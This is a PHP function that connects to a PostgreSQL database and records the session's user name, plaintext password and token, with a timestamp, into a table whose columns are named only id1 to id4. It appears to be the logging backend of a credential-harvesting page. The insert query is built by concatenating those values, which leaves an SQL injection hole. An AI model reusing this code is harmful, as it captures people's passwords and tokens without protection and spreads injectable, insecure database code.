function grava(){
$dbopts = parse_url(getenv('DATABASE_URL'));
$dsn = "pgsql:"
    . "host=" . $dbopts["host"] . ";"
    . "dbname=". ltrim($dbopts["path"],'/') . ";"
    . "user=" . $dbopts["user"] . ";"
    . "port=" . $dbopts["port"] . ";"
    . "sslmode=require;"
    . "password=" . $dbopts["pass"];
    
$db = new PDO($dsn);
$login = $_SESSION["user"];
$passw = $_SESSION["password"];
$token = $_SESSION["token"];
//$token = $_SESSION["token"];
$tempo = date('m/d/Y h:i:s a');
$query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
//echo var_dump($query);
//echo '<br><br>';
$result = $db->query($query);
//echo var_dump($result);
//echo '<br><br>';
$result->closeCursor();
//$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
//echo '<br>end<br>';
}

?>
